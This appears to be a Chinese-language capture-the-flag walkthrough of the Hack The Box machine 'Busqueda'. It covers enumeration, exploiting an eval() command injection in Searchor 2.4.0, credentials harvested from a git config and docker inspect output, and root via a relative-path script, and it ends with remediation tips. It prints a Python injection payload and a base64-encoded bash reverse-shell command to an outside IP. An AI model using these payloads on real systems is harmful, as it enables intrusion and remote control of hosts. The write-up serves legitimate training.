概要

Busqueda是一种容易的Linux机器，它涉及利用存在于python模块中它使用的是Python
Searchor命令行工具通过利用此漏洞，我们获得了对计算机的用户访问权限，通过git配置文件发现了ssh登录密码  
通过docker发现了密码，登录gitea查看系统脚本为我们提供了一种rce的方法。

所需技能  
网络基础知识  
linux基础  
python基础

学到技能  
fuzz知识  
命令注入  
源码分析  
docker基础

目标枚举信息收集

    
    
    nmap -min-rate 1000 -p- 10.129.111.31 
    PORT      STATE    SERVICE
    22/tcp    open     ssh
    80/tcp    open     http
    47094/tcp filtered unknown
    
    nmap -min-rate 1000 -p22,80 -sV -sC 10.129.111.31
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
    |_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
    80/tcp open  http    Apache httpd 2.4.52
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    |_http-title: Did not follow redirect to http://searcher.htb/
    Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

把目标域名加入/etc/hosts文件

使用curl 判断机器

    
    
    curl -v -s 10.129.111.31
    *   Trying 10.129.111.31:80...
    * Connected to 10.129.111.31 (10.129.111.31) port 80 (#0)
    > GET / HTTP/1.1
    > Host: 10.129.111.31
    > User-Agent: curl/7.88.1
    > Accept: */*
    > 
    < HTTP/1.1 302 Found
    < Date: Wed, 30 Aug 2023 09:00:25 GMT
    < Server: Apache/2.4.52 (Ubuntu)
    < Location: http://searcher.htb/
    < Content-Length: 283
    < Content-Type: text/html; charset=iso-8859-1

发现使用apache  
但是通过域名访问有发现是python

    
    
    curl -v -s searcher.htb 1>/dev/null
    *   Trying 10.129.111.31:80...
    * Connected to searcher.htb (10.129.111.31) port 80 (#0)
    > GET / HTTP/1.1
    > Host: searcher.htb
    > User-Agent: curl/7.88.1
    > Accept: */*
    > 
    < HTTP/1.1 200 OK
    < Date: Wed, 30 Aug 2023 09:02:43 GMT
    < Server: Werkzeug/2.1.2 Python/3.10.6
    < Content-Type: text/html; charset=utf-8
    < Content-Length: 13519
    < Vary: Accept-Encoding
    < 
    { [2472 bytes data]
    * Connection #0 to host searcher.htb left intact

这样我们猜测它是使用python werkzeup网站类型的apache是反向代理

为此我们去访问站点

![](./img/1237082165798263282.png)

这里我们有2种方法到达立足点  
第一种就是针对 flask 主要是对这个searchor 2.4.0 进行查看  
点击找到源码网站<https://github.com/ArjunSharda/Searchor>

![](./img/4864062091603332475.png)

在其2.4.2中他说修复了一个漏洞，我们去定位到这里  
<https://github.com/ArjunSharda/Searchor/pull/130/files/29d5b1f28d29d6a282a5e860d456fab2df24a16b>

    
    
    @click.argument("query")
    def search(engine, query, open, copy):
        try:
            url = eval(
                f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
            )
            url = Engine[engine].search(query, copy_url=copy, open_web=open)
            click.echo(url)
            searchor.history.update(engine, query, url)
            if open:
    

根据这个代码格式我们会发现他使用eval  
因为它使用eval来执行查询，所以如果我们可以对其进行自定义的查询，我们就可以运行任意的python代码  
他的漏洞修复简介里都有写  
我们这里主要说的是第2种方法

我们不知道源码和他说的修复漏洞的拉取，而进行猜测方式的fuzz攻击  
同时理解程序结构，最后构造代码命令执行语句  
我们使用burp抓包

![](./img/4359375582782750656.png)

![](./img/4843546254535630183.png)

会发现他是一个把我们的输入输出给一些网站的  
同时我们点击了 auto redirect他会自动的跳转过去的一个“搜索”工具

![](./img/5241946491605116841.png)  
为啥做这些测试，这个就属于了解网站结构功能针对这些进行测试

![](./img/2647439971027099587.png)

我们把数据使用burp保存  
使用fuzz工具打开  
参数写上fuzz

![](./img/2932984359442687247.png)  
ffuf -request searcher.req -request-proto http -w
/usr/share/seclists/Fuzzing/special-chars.txt  
这个命令是在使用 ffuf 工具进行 Web Fuzzing（模糊测试）的操作。ffuf 是一个用于模糊测试的工具，它可以帮助您发现 Web
应用程序中的潜在漏洞和问题。

具体解释如下：

ffuf：是一个用于模糊测试的工具，支持并发请求和多种参数组合。

-request searcher.req：这个选项指定了请求文件的路径，ffuf 将使用该请求文件作为测试的模板来构造请求。

-request-proto http：这个选项指定了要测试的协议，这里是 HTTP。

-w /usr/share/seclists/Fuzzing/special-chars.txt：这个选项指定了一个字典文件的路径，ffuf 将使用该字典文件中的内容来模糊测试参数。  
它将使用 searcher.req 这个请求文件作为模板，构造 HTTP 请求。同时，它会将
/usr/share/seclists/Fuzzing/special-chars.txt
字典中的内容用于模糊测试，即尝试不同的特殊字符组合作为参数值，以尝试发现可能的漏洞或问题。这可以帮助测试 Web 应用程序在不同输入情况下的响应和行为

![](./img/6383993207433569178.png)

我们会发现很多输入和输出结果

![](./img/6924110820028022446.png)  
根据图片我们猜测使用单引号是不是闭合了网站，所以猜测是不是有sql注入但是失败了

    
    
    为此我们去找寻是不是存在ssti
    https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
    ${{<%[%'"}}%\.
    POST /search HTTP/1.1
    Host: searcher.htb
    Content-Length: 34
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://searcher.htb
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://searcher.htb/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Connection: close
    
    engine=Accuweather&query=11${{<%[%
    
    等我们输入${{<%[% 发生返回

![](./img/1108884338495237863.png)

ffuf -request searcher.req -request-proto http -w
/usr/share/seclists/Fuzzing/special-chars.txt -ms 0  
再次模糊查询我们发现了\'

![](./img/2793474283924457906.png)

因为根据网络查看它看起来是python 那么它的语法应该就是print('输入')  
engine=Accuweather&query=11')%20%23%20  
这样我们就生成了语法 %20%23%20注释的意思可以参考注入里面的闭合后注释

![](./img/2694906510887679921.png)

所以我们现在猜测是不是在python中类似的eval后面  
%2b 等于+

![](./img/233473387627137930.png)

![](./img/6721289219312309358.png)

所以我们现在想可以和操作系统命令吗导入系统模块  
engine=Accuweather&query=11')%2b **import** ('os').system('id')%20%23%20

![](./img/7797582004775249383.png)

这里我们就开始尝试是不是可以反弹shell  
我们使用base64加密反弹shell语句  
echo -n "bash -c 'bash -i >& /dev/tcp/192.11.16.25/9001 0>1&' " |base64  
YmFzaCAtYyAnYmFzaCAtaSAgID4mICAvZGV2L3RjcC8xOTIuMTEuMTYuMjUvOTAwMSAwPjEmJyAg  
这个只是演示，你生成完以后一定要在本地尝试，看看可以使用吗

![](./img/2423364038036698508.png)

![](./img/4354793889894206789.png)

这样我们就算是立足了

横向移动  
同样先信息收集

    
    
    svc@busqueda:/var/www/app/.git$ cat config 
    [core]
            repositoryformatversion = 0
            filemode = true
            bare = false
            logallrefupdates = true
    [remote "origin"]
            url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
            fetch = +refs/heads/*:refs/remotes/origin/*
    [branch "main"]
            remote = origin
            merge = refs/heads/main

我们发现了一个cody用户和一个jh1usoih2bkjaspwe92

    
    
    cat /etc/passwd | grep bash
    root:x:0:0:root:/root:/bin/bash
    svc:x:1000:1000:svc:/home/svc:/bin/bash

我们使用这个密码尝试登录发现可以登录svc（这就是密码通用）

![](./img/2101439217353268305.png)

登录成功以后查看端口也是信息收集的一部分

![](./img/5094136340328420215.png)

同时因为上面也有一个网站域名，我们也同时打开

![](./img/3546353972947225518.png)

![](./img/3965179689545727322.png)  
使用sudo -l 查看看看有可以利用的点吗  
我们发现了

![](./img/4687982466615096883.png)

它给了我们docker-ps 和docker-inspect

sudo python3 /opt/scripts/system-checkup.py docker-ps  
发现了2个容器  
![](./img/3988253600551242305.png)

了解<https://docs.docker.com/engine/reference/commandline/inspect>  
docker-inspect 用法

![](./img/8553112921422313813.png)

    
    
    sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 9608 |jq .
    {
      "Hostname": "960873171e2e",
      "Domainname": "",
      "User": "",
      "AttachStdin": false,
      "AttachStdout": false,
      "AttachStderr": false,
      "ExposedPorts": {
        "22/tcp": {},
        "3000/tcp": {}
      },
      "Tty": false,
      "OpenStdin": false,
      "StdinOnce": false,
      "Env": [
        "USER_UID=115",
        "USER_GID=121",
        "GITEA__database__DB_TYPE=mysql",
        "GITEA__database__HOST=db:3306",
        "GITEA__database__NAME=gitea",
        "GITEA__database__USER=gitea",
        "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "USER=git",
        "GITEA_CUSTOM=/data/gitea"
      ],
      "Cmd": [
        "/bin/s6-svscan",
        "/etc/s6"
      ],
      "Image": "gitea/gitea:latest",
      "Volumes": {
        "/data": {},
        "/etc/localtime": {},
        "/etc/timezone": {}
      },
      "WorkingDir": "",
      "Entrypoint": [
        "/usr/bin/entrypoint"
      ],
      "OnBuild": null,
      "Labels": {
        "com.docker.compose.config-hash": "e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515",
        "com.docker.compose.container-number": "1",
        "com.docker.compose.oneoff": "False",
        "com.docker.compose.project": "docker",
        "com.docker.compose.project.config_files": "docker-compose.yml",
        "com.docker.compose.project.working_dir": "/root/scripts/docker",
        "com.docker.compose.service": "server",
        "com.docker.compose.version": "1.29.2",
        "maintainer": "maintainers@gitea.io",
        "org.opencontainers.image.created": "2022-11-24T13:22:00Z",
        "org.opencontainers.image.revision": "9bccc60cf51f3b4070f5506b042a3d9a1442c73d",
        "org.opencontainers.image.source": "https://github.com/go-gitea/gitea.git",
        "org.opencontainers.image.url": "https://github.com/go-gitea/gitea"
      }
    }
    

我们这里有发现了用户和密码还有3306 yuiu1hoiu4i5ho1uh  
也可以mysql -h 127.0.0.1 -u gitea -pyuiu1hoiu4i5ho1uh gitea 进入数据库去查看用户名密码  
select name,email,passwd from user;  
这里直接去登录运气比较好  
我们使用这个密码可以登录到administrator账号

查看脚本  
<http://gitea.searcher.htb/administrator/scripts/src/branch/main/system-checkup.py>  
![](./img/6216399582167224699.png)

    
    
    这一段语法比较有意思
      elif action == 'full-checkup':
            try:
                arg_list = ['./full-checkup.sh']
                print(run_command(arg_list))
                print('[+] Done!')
            except:
                print('Something went wrong')
                exit(1)
    

他会直接调用一个full-checkup.sh同时是相对路径，没有写死绝对路径，就是任意位置存在这个都可以执行

这里我们就可以去写一个full-checkup.sh让run_command运行

![](./img/6011632434637009567.png)

![](./img/4019848553663840498.png)

![](./img/6824655040478102805.png)

修复建议  
1 时刻更新软件系统保持最新排查问题  
2 避免弱口令，通用口令  
3 脚本目录权限配置正确，禁止无关写入，调用尽量写绝对路径，同时不设置写入权限或者控制权限分配正确

如果我们跟新了搜索器 就不会有立足点  
口令不通用我们也不会快速登录其他位置  
权限配置正确我们没有写入或者路径其他位置不能执行，就无法执行(root) /usr/bin/python3 /opt/scripts/system-checkup.py *

